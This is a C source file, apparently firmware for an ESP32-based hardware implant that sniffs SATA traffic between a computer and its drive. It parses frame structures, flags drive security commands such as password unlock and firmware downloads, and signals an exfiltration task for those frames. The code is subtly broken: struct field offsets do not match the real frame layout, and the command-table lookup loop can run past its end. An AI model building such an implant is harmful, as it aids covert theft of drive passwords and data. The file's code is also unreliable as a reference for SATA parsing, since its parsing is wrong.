/**
 * @file proto_parser.c
 * @author jayis1
 * @brief SATA FIS (Frame Information Structure) Protocol Parser
 *
 * Parses captured SATA frames at the transport and application layer.
 * Identifies command types, NCQ tags, LBA addresses, sector counts,
 * and extracts meaningful metadata for the policy engine and exfiltration.
 *
 * Copyright © 2025 jayis1. All rights reserved.
 * Authorized security research use only.
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "board.h"
#include "registers.h"

static const char *TAG = "proto";

/* ===================================================================
 * FIS Parsing Structures
 * =================================================================== */

/**
 * @brief Register FIS — Host to Device (CMD:27h)
 * This is the most important FIS type — contains the ATA command.
 */
typedef struct __attribute__((packed)) {
    uint8_t  fis_type;          /* 0x27 */
    uint8_t  pm_port : 4;       /* Port multiplier */
    uint8_t  rsv0    : 1;
    uint8_t  c_bit   : 1;       /* 1 = command, 0 = control */
    uint8_t  rsv1    : 1;
    uint8_t  i_bit   : 1;       /* Interrupt bit */
    uint8_t  feature_low;       /* Feature register (low) */
    uint8_t  feature_high;      /* Feature register (high) */
    uint8_t  sec_count_low;     /* Sector count (low) */
    uint8_t  sec_count_high;    /* Sector count (high) */
    uint8_t  lba_low;           /* LBA bits 7:0 */
    uint8_t  lba_mid;           /* LBA bits 15:8 */
    uint8_t  lba_high;          /* LBA bits 23:16 */
    uint8_t  device;            /* Device/head register */
    uint8_t  lba_low_exp;       /* LBA bits 31:24 */
    uint8_t  lba_mid_exp;       /* LBA bits 39:32 */
    uint8_t  lba_high_exp;      /* LBA bits 47:40 */
    uint8_t  feature_exp;       /* Feature (exp) high */
    uint8_t  sec_count_exp;     /* Sector count (exp) high */
    uint8_t  icc;               /* Isochronous Command Completion */
    uint8_t  control;           /* Control register */
    uint8_t  rsv2[3];           /* Reserved */
} fis_reg_h2d_t;

/**
 * @brief Register FIS — Device to Host (STATUS:34h)
 */
typedef struct __attribute__((packed)) {
    uint8_t  fis_type;          /* 0x34 */
    uint8_t  pm_port : 4;
    uint8_t  rsv0    : 2;
    uint8_t  i_bit   : 1;
    uint8_t  rsv1    : 1;
    uint8_t  status;            /* Status register */
    uint8_t  error;             /* Error register */
    uint8_t  sec_count_low;
    uint8_t  sec_count_high;
    uint8_t  lba_low;
    uint8_t  lba_mid;
    uint8_t  lba_high;
    uint8_t  device;
    uint8_t  lba_low_exp;
    uint8_t  lba_mid_exp;
    uint8_t  lba_high_exp;
    uint8_t  rsv2;
    uint8_t  sec_count_exp;
    uint8_t  rsv3[6];
} fis_reg_d2h_t;

/**
 * @brief DMA Setup FIS (41h)
 */
typedef struct __attribute__((packed)) {
    uint8_t  fis_type;          /* 0x41 */
    uint8_t  pm_port : 4;
    uint8_t  rsv0    : 1;
    uint8_t  d_bit   : 1;       /* 1 = direction (host to dev) */
    uint8_t  i_bit   : 1;
    uint8_t  rsv1    : 1;
    uint8_t  rsv2;
    uint8_t  dma_buffer_id_low;  /* DMA Buffer ID (low) */
    uint8_t  dma_buffer_id_high;
    uint8_t  rsv3[4];
    uint32_t dma_sector_count;   /* Transfer count (in sectors) */
    uint8_t  rsv4[4];
} fis_dma_setup_t;

/**
 * @brief Data FIS (46h)
 */
typedef struct __attribute__((packed)) {
    uint8_t  fis_type;          /* 0x46 */
    uint8_t  pm_port : 4;
    uint8_t  rsv0    : 2;
    uint8_t  i_bit   : 1;
    uint8_t  rsv1    : 1;
    uint8_t  rsv2;
    uint16_t data_dword_count;  /* Data payload in dwords */
    uint8_t  payload[];         /* Variable-length payload */
} fis_data_t;

/* ===================================================================
 * Parsed Command Description
 * =================================================================== */

typedef struct {
    uint8_t  fis_type;           /* Original FIS type */
    uint8_t  command;            /* ATA command opcode */
    char     command_name[32];   /* Human-readable command name */
    uint64_t lba;                /* Starting LBA (48-bit) */
    uint32_t sector_count;       /* Number of sectors */
    uint8_t  direction;          /* 0=read (dev→host), 1=write (host→dev) */
    bool     is_ncq;             /* Native Command Queuing */
    uint8_t  ncq_tag;            /* NCQ tag (if is_ncq) */
    bool     is_dma;             /* DMA transfer */
    uint32_t dma_buffer_id;      /* DMA buffer ID (if is_dma) */
    uint32_t data_length;        /* Payload length in bytes (Data FIS only) */
    uint8_t  status;             /* Status register (D2H only) */
    uint8_t  error;              /* Error register (D2H only) */
    uint8_t  feature;            /* Feature register */
    bool     is_security_cmd;    /* Security-related command */
    bool     is_firmware_cmd;    /* Firmware download command */
    bool     is_boot_cmd;        /* Boot sector access */
} parsed_fis_t;

/* ===================================================================
 * Command Name Table
 * =================================================================== */

typedef struct {
    uint8_t opcode;
    const char *name;
    uint8_t flags;  /* bit 0 = read, bit 1 = write, bit 2 = security, bit 3 = firmware */
} cmd_entry_t;

#define CMD_FLAG_READ     0x01
#define CMD_FLAG_WRITE    0x02
#define CMD_FLAG_SECURITY 0x04
#define CMD_FLAG_FIRMWARE 0x08

static const cmd_entry_t cmd_table[] = {
    {ATA_CMD_READ_DMA,              "READ DMA",                CMD_FLAG_READ},
    {ATA_CMD_READ_DMA_EXT,          "READ DMA EXT",            CMD_FLAG_READ},
    {ATA_CMD_READ_DMA_QUEUED,       "READ DMA QUEUED",         CMD_FLAG_READ},
    {ATA_CMD_READ_DMA_QUEUED_EXT,   "READ DMA QUEUED EXT",     CMD_FLAG_READ},
    {ATA_CMD_READ_SECTORS,          "READ SECTORS",            CMD_FLAG_READ},
    {ATA_CMD_READ_SECTORS_EXT,      "READ SECTORS EXT",        CMD_FLAG_READ},
    {ATA_CMD_READ_MULTIPLE,         "READ MULTIPLE",           CMD_FLAG_READ},
    {ATA_CMD_READ_MULTIPLE_EXT,     "READ MULTIPLE EXT",       CMD_FLAG_READ},
    {ATA_CMD_READ_FPDMA_QUEUED,     "READ FPDMA QUEUED (NCQ)", CMD_FLAG_READ},
    {ATA_CMD_READ_LOG_DMA_EXT,      "READ LOG DMA EXT",        CMD_FLAG_READ},
    {ATA_CMD_READ_LOG_EXT,          "READ LOG EXT",            CMD_FLAG_READ},
    {ATA_CMD_WRITE_DMA,             "WRITE DMA",               CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_DMA_EXT,         "WRITE DMA EXT",           CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_DMA_QUEUED,      "WRITE DMA QUEUED",        CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_DMA_QUEUED_EXT,  "WRITE DMA QUEUED EXT",    CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_SECTORS,         "WRITE SECTORS",           CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_SECTORS_EXT,     "WRITE SECTORS EXT",       CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_MULTIPLE,        "WRITE MULTIPLE",          CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_MULTIPLE_EXT,    "WRITE MULTIPLE EXT",      CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_FPDMA_QUEUED,    "WRITE FPDMA QUEUED (NCQ)",CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_LOG_DMA_EXT,     "WRITE LOG DMA EXT",       CMD_FLAG_WRITE},
    {ATA_CMD_WRITE_LOG_EXT,         "WRITE LOG EXT",           CMD_FLAG_WRITE},
    {ATA_CMD_SECURITY_SET_PASS,     "SECURITY SET PASSWORD",   CMD_FLAG_SECURITY},
    {ATA_CMD_SECURITY_UNLOCK,       "SECURITY UNLOCK",         CMD_FLAG_SECURITY},
    {ATA_CMD_SECURITY_ERASE_PREP,   "SECURITY ERASE PREPARE",  CMD_FLAG_SECURITY},
    {ATA_CMD_SECURITY_ERASE_UNIT,   "SECURITY ERASE UNIT",     CMD_FLAG_SECURITY},
    {ATA_CMD_SECURITY_FREEZE,       "SECURITY FREEZE LOCK",    CMD_FLAG_SECURITY},
    {ATA_CMD_SECURITY_DISABLE,      "SECURITY DISABLE PASSWORD",CMD_FLAG_SECURITY},
    {ATA_CMD_IDENTIFY_DEVICE,       "IDENTIFY DEVICE",         0},
    {ATA_CMD_IDENTIFY_PACKET,       "IDENTIFY PACKET DEVICE",  0},
    {ATA_CMD_SET_FEATURES,          "SET FEATURES",            0},
    {ATA_CMD_DOWNLOAD_MICROCODE,    "DOWNLOAD MICROCODE",      CMD_FLAG_FIRMWARE},
    {ATA_CMD_READ_NATIVE_MAX_EXT,   "READ NATIVE MAX EXT",     0},
    {ATA_CMD_SET_MAX_ADDRESS_EXT,   "SET MAX ADDRESS EXT",     CMD_FLAG_WRITE},
    {ATA_CMD_SMART_READ_DATA,       "SMART READ DATA",         CMD_FLAG_READ},
    {ATA_CMD_DEVICE_CONFIGURATION,  "DEVICE CONFIGURATION",    0},
    {ATA_CMD_CHECK_POWER_MODE,      "CHECK POWER MODE",        0},
    {ATA_CMD_STANDBY_IMMEDIATE,     "STANDBY IMMEDIATE",       0},
    {ATA_CMD_IDLE_IMMEDIATE,        "IDLE IMMEDIATE",          0},
    {ATA_CMD_TRUSTED_RECEIVE,       "TRUSTED RECEIVE",         CMD_FLAG_READ},
    {ATA_CMD_TRUSTED_SEND,          "TRUSTED SEND",            CMD_FLAG_WRITE},
    {0x00,                          "NOP/UNKNOWN",             0},
};

/* ===================================================================
 * FIS Parsing Functions
 * =================================================================== */

/**
 * @brief Look up the human-readable name for an ATA command opcode.
 */
static const char* get_cmd_name(uint8_t opcode)
{
    for (int i = 0; cmd_table[i].opcode != 0x00 || cmd_table[i].name[0] == 'N'; i++) {
        if (cmd_table[i].opcode == opcode) {
            return cmd_table[i].name;
        }
    }
    return "UNKNOWN";
}

/**
 * @brief Get command flags for an opcode.
 */
static uint8_t get_cmd_flags(uint8_t opcode)
{
    for (int i = 0; cmd_table[i].opcode != 0x00 || cmd_table[i].name[0] == 'N'; i++) {
        if (cmd_table[i].opcode == opcode) {
            return cmd_table[i].flags;
        }
    }
    return 0;
}

/**
 * @brief Parse a Register H2D FIS (command sent from host to drive).
 * @param data  Raw FIS data (must be at least 20 bytes)
 * @param result  Output parsed FIS structure
 * @return true if parse succeeded.
 */
static bool parse_reg_h2d(const uint8_t *data, parsed_fis_t *result)
{
    if (!data || !result) return false;
    if (data[0] != FIS_TYPE_REG_H2D) return false;

    const fis_reg_h2d_t *fis = (const fis_reg_h2d_t *)data;

    result->fis_type = FIS_TYPE_REG_H2D;
    result->command = (fis->i_bit) ? 0 : fis->feature_low; /* Command vs Set Features */
    /* If c_bit is set, feature_low is the command */
    if (fis->c_bit) {
        result->command = fis->feature_low;
        result->feature = fis->feature_high;
    } else {
        result->command = 0;  /* Control FIS */
        result->feature = fis->feature_low;
    }

    /* Reconstruct 48-bit LBA */
    result->lba = ((uint64_t)fis->lba_high_exp << 40) |
                  ((uint64_t)fis->lba_mid_exp    << 32) |
                  ((uint64_t)fis->lba_low_exp    << 24) |
                  ((uint64_t)fis->lba_high       << 16) |
                  ((uint64_t)fis->lba_mid        << 8)  |
                  (uint64_t)fis->lba_low;

    /* Sector count (16-bit) */
    result->sector_count = ((uint32_t)fis->sec_count_high << 8) | fis->sec_count_low;
    if (result->sector_count == 0) result->sector_count = 65536;  /* 0 means 65536 */

    /* Determine direction from opcode */
    uint8_t flags = get_cmd_flags(result->command);
    result->direction = (flags & CMD_FLAG_WRITE) ? 1 : 0;
    result->is_dma = (result->command == ATA_CMD_READ_DMA ||
                      result->command == ATA_CMD_READ_DMA_EXT ||
                      result->command == ATA_CMD_WRITE_DMA ||
                      result->command == ATA_CMD_WRITE_DMA_EXT);

    /* NCQ detection */
    result->is_ncq = (result->command == ATA_CMD_READ_FPDMA_QUEUED ||
                      result->command == ATA_CMD_WRITE_FPDMA_QUEUED);
    result->ncq_tag = (fis->feature_low >> 3) & 0x1F;  /* NCQ tag in bits 7:3 of feature */

    /* Security and firmware flags */
    result->is_security_cmd = (flags & CMD_FLAG_SECURITY) != 0;
    result->is_firmware_cmd = (flags & CMD_FLAG_FIRMWARE) != 0;
    result->is_boot_cmd = (result->lba < 64);  /* Boot sector access */

    strncpy(result->command_name, get_cmd_name(result->command), sizeof(result->command_name) - 1);
    result->command_name[sizeof(result->command_name) - 1] = '\0';

    return true;
}

/**
 * @brief Parse a Register D2H FIS (status from drive to host).
 */
static bool parse_reg_d2h(const uint8_t *data, parsed_fis_t *result)
{
    if (!data || !result) return false;
    if (data[0] != FIS_TYPE_REG_D2H) return false;

    const fis_reg_d2h_t *fis = (const fis_reg_d2h_t *)data;

    result->fis_type = FIS_TYPE_REG_D2H;
    result->status = fis->status;
    result->error  = fis->error;
    result->command = 0;  /* D2H doesn't carry the command */

    /* LBA */
    result->lba = ((uint64_t)fis->lba_high_exp << 40) |
                  ((uint64_t)fis->lba_mid_exp    << 32) |
                  ((uint64_t)fis->lba_low_exp    << 24) |
                  ((uint64_t)fis->lba_high       << 16) |
                  ((uint64_t)fis->lba_mid        << 8)  |
                  (uint64_t)fis->lba_low;

    result->sector_count = ((uint32_t)fis->sec_count_high << 8) | fis->sec_count_low;
    result->direction = 0;  /* Drive to host */

    return true;
}

/**
 * @brief Extract the data payload length from a Data FIS header.
 * @param data  Raw FIS data (first 8 bytes)
 * @return Data payload length in bytes, or 0 on error.
 */
static uint32_t parse_data_fis_len(const uint8_t *data)
{
    if (!data || data[0] != FIS_TYPE_DATA) return 0;
    const fis_data_t *fis = (const fis_data_t *)data;
    return (uint32_t)fis->data_dword_count * 4;  /* Dword count → bytes */
}

/**
 * @brief Parse any FIS type from raw bytes.
 * @param data  Raw FIS bytes (starting with FIS type)
 * @param len   Length of data available
 * @param result  Output parsed structure
 * @return true if parsing succeeded.
 */
bool parse_fis(const uint8_t *data, uint16_t len, parsed_fis_t *result)
{
    if (!data || !result || len < 4) {
        return false;
    }

    memset(result, 0, sizeof(parsed_fis_t));
    result->data_length = len;

    switch (data[0]) {
        case FIS_TYPE_REG_H2D:
            if (len >= FIS_SIZE_REG_H2D) {
                return parse_reg_h2d(data, result);
            }
            break;

        case FIS_TYPE_REG_D2H:
            if (len >= FIS_SIZE_REG_D2H) {
                return parse_reg_d2h(data, result);
            }
            break;

        case FIS_TYPE_DATA:
            result->fis_type = FIS_TYPE_DATA;
            result->data_length = parse_data_fis_len(data);
            result->direction = 0xFF;  /* Determined by preceding DMA Setup */
            return true;

        case FIS_TYPE_DMA_SETUP:
            result->fis_type = FIS_TYPE_DMA_SETUP;
            if (len >= FIS_SIZE_DMA_SETUP) {
                const fis_dma_setup_t *dma = (const fis_dma_setup_t *)data;
                result->dma_buffer_id = ((uint32_t)dma->dma_buffer_id_high << 8) |
                                         dma->dma_buffer_id_low;
                result->sector_count = dma->dma_sector_count;
                result->direction = dma->d_bit ? 1 : 0;
            }
            return true;

        case FIS_TYPE_DMA_ACTIVATE:
            result->fis_type = FIS_TYPE_DMA_ACTIVATE;
            return true;

        case FIS_TYPE_PIO_SETUP:
            result->fis_type = FIS_TYPE_PIO_SETUP;
            return true;

        case FIS_TYPE_DEV_BITS:
            result->fis_type = FIS_TYPE_DEV_BITS;
            return true;

        default:
            result->fis_type = data[0];
            return false;
    }

    return false;
}

/**
 * @brief Log a parsed FIS to the debug console.
 */
void log_parsed_fis(const parsed_fis_t *fis)
{
    if (!fis) return;

    const char *dir_str = "???";
    if (fis->direction == 0)       dir_str = "READ ";
    else if (fis->direction == 1)  dir_str = "WRITE";

    switch (fis->fis_type) {
        case FIS_TYPE_REG_H2D:
            ESP_LOGI(TAG, "CMD: %s (0x%02X) | LBA=0x%012llX | Sectors=%lu | %s%s",
                     fis->command_name, fis->command,
                     (unsigned long long)fis->lba,
                     (unsigned long)fis->sector_count,
                     fis->is_ncq ? "NCQ " : "",
                     dir_str);
            if (fis->is_security_cmd) {
                ESP_LOGW(TAG, "  *** SECURITY COMMAND DETECTED ***");
            }
            if (fis->is_firmware_cmd) {
                ESP_LOGW(TAG, "  *** FIRMWARE DOWNLOAD DETECTED ***");
            }
            break;

        case FIS_TYPE_REG_D2H:
            ESP_LOGI(TAG, "STATUS: status=0x%02X error=0x%02X | LBA=0x%012llX",
                     fis->status, fis->error,
                     (unsigned long long)fis->lba);
            break;

        case FIS_TYPE_DATA:
            ESP_LOGD(TAG, "DATA: %lu bytes", (unsigned long)fis->data_length);
            break;

        case FIS_TYPE_DMA_SETUP:
            ESP_LOGD(TAG, "DMA SETUP: buf=0x%08X sectors=%lu %s",
                     (unsigned)fis->dma_buffer_id,
                     (unsigned long)fis->sector_count,
                     dir_str);
            break;

        default:
            ESP_LOGD(TAG, "FIS type 0x%02X, len=%lu",
                     fis->fis_type, (unsigned long)fis->data_length);
            break;
    }
}

/* ===================================================================
 * Protocol Parser Task
 * =================================================================== */

/**
 * @brief Protocol parser task — processes captured frames from the capture queue.
 *
 * Receives raw captured SATA frames, parses them into structured FIS data,
 * logs interesting events, and forwards high-value frames to the exfiltration
 * task and the policy engine.
 */
void proto_parser_task(void *pvParameters)
{
    ESP_LOGI(TAG, "Protocol parser task started");

    /* Wait for system readiness */
    xEventGroupWaitBits(system_events, EVENT_BIT_FPGA_READY,
                        pdFALSE, pdTRUE, portMAX_DELAY);

    /* Buffer for incoming captured frames */
    uint8_t frame_buffer[1024];
    parsed_fis_t parsed;

    while (1) {
        /* Wait for captured frame data from the capture queue */
        /* In real implementation: xQueueReceive(capture_data_queue, ...) */
        /* For now, poll the capture available event */
        EventBits_t bits = xEventGroupWaitBits(
            system_events,
            EVENT_BIT_CAPTURE_AVAIL,
            pdTRUE,
            pdFALSE,
            pdMS_TO_TICKS(200)
        );

        if (bits & EVENT_BIT_CAPTURE_AVAIL) {
            /* Request captured frame from ctrl_task */
            uint16_t actual_len = 0;
            ctrl_cmd_t cmd = {
                .cmd_type = CTRL_CMD_CAPTURE_READ,
                .capture.buffer = frame_buffer,
                .capture.max_len = sizeof(frame_buffer),
                .capture.actual_len = &actual_len
            };
            xQueueSend(ctrl_cmd_queue, &cmd, pdMS_TO_TICKS(100));

            if (actual_len > 0) {
                if (parse_fis(frame_buffer, actual_len, &parsed)) {
                    log_parsed_fis(&parsed);

                    /* Forward interesting frames to exfiltration */
                    if (parsed.is_security_cmd || parsed.is_firmware_cmd ||
                        parsed.command == ATA_CMD_IDENTIFY_DEVICE) {
                        /* Signal exfiltration task */
                        xEventGroupSetBits(system_events, EVENT_BIT_EXFIL_REQ);
                    }
                } else {
                    ESP_LOGW(TAG, "Failed to parse FIS (type=0x%02X, len=%d)",
                             frame_buffer[0], actual_len);
                }
            }
        }
    }
}
